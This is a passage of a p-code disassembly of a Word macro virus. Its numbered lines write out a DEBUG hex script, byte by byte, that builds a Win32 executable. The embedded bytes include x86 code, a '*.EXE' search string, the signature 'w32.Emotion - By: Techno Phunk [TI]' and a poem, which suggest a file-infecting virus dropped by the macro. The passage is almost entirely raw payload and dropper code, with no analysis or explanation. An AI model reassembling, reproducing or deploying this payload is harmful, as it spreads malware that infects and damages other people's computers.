' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #54:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0400 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #55:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0410 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #56:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0420 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #57:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0430 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #58:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0440 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #59:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0450 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #60:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0460 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #61:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0470 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #62:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0480 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #63:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0490 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #64:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 04a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #65:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 04b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #66:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 04c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #67:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 04d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #68:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 04e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #69:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 04f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #70:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0500 6a 00 e8 77 06 00 00 68 04 01 00 00 68 25 14 40 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #71:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0510 00 50 e8 a3 06 00 00 e9 9d 00 00 00 68 04 01 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #72:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0520 00 68 1d 12 40 00 e8 77 06 00 00 68 1d 12 40 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #73:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0530 e8 79 06 00 00 c6 05 39 15 40 00 01 eb 7b e8 47 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #74:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0540 06 00 00 8b f0 bf 25 14 40 00 aa ac 0a c0 75 fa "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #75:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0550 b8 2e 00 00 00 bf 25 14 40 00 b9 04 01 00 00 f2 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #76:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0560 ae c7 07 62 69 6e 20 66 c7 05 25 14 40 00 20 20 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #77:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0570 68 29 15 40 00 e8 22 06 00 00 80 3d 2b 15 40 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #78:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0580 05 75 23 80 3d 2f 15 40 00 0d 75 1a 6a 10 68 6d "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #79:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0590 11 40 00 68 91 11 40 00 6a 00 e8 27 06 00 00 6a "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #80:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 05a0 01 e8 1a 06 00 00 6a 01 68 25 14 40 00 e8 02 06 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #81:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 05b0 00 00 6a 00 e8 bf 05 00 00 68 3a 15 40 00 68 67 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #82:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 05c0 11 40 00 e8 c8 05 00 00 83 f8 ff 74 3e bf 3a 15 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #83:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 05d0 40 00 8d 77 2c 50 eb 45 57 8d 7f 2c b9 0d 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #84:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 05e0 00 32 c0 f3 aa bf 21 13 40 00 b9 0d 00 00 00 32 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #85:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 05f0 c0 f3 aa 5f 58 50 57 50 e8 87 05 00 00 0b c0 74 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #86:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0600 0a bf 3a 15 40 00 8d 77 2c eb 12 80 3d 39 15 40 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #87:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0610 00 01 0f 84 26 ff ff ff e9 ff fe ff ff 57 66 8d "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #88:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0620 77 2c bf 21 13 40 00 ac aa 0a c0 75 fa 33 c0 bf "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #89:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0630 21 13 40 00 b9 41 00 00 00 f2 ae c7 47 fc 62 69 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #90:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0640 6e 00 5f 68 21 13 40 00 8d 47 2c 50 e8 57 05 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #91:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0650 00 6a 00 8d 47 2c 50 b8 25 14 40 00 50 e8 34 05 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #92:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0660 00 00 e9 71 ff ff ff 2a 2e 45 58 45 00 77 33 32 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #93:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0670 2e 45 6d 6f 74 69 6f 6e 20 2d 20 42 79 3a 20 54 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #94:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0680 65 63 68 6e 6f 20 50 68 75 6e 6b 20 5b 54 49 5d "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #95:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0690 00 41 20 70 6f 6f 6c 20 6f 66 20 65 6d 6f 74 69 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #96:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 06a0 6f 6e 73 2c 20 62 65 61 74 65 6e 20 61 6e 64 20 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #97:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 06b0 61 62 75 73 65 64 2e 0d 0a 57 68 6f 20 77 69 6c "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #98:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 06c0 6c 20 73 77 69 6d 20 69 6e 20 74 68 65 20 73 74 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #99:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 06d0 61 6c 65 20 77 61 74 65 72 73 3f 20 4e 6f 74 20 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #100:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 06e0 61 20 6f 6e 65 0d 0a 42 75 74 20 6d 61 6e 79 20 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #101:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 06f0 77 69 6c 6c 20 73 63 6f 66 66 20 61 6e 64 20 64 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #102:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0700 65 73 74 72 6f 79 20 74 68 69 73 20 70 6f 6f 6c "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #103:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0710 20 77 69 74 68 20 61 70 61 74 68 79 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #104:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0720 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #105:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0730 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #106:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0740 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #107:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0750 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
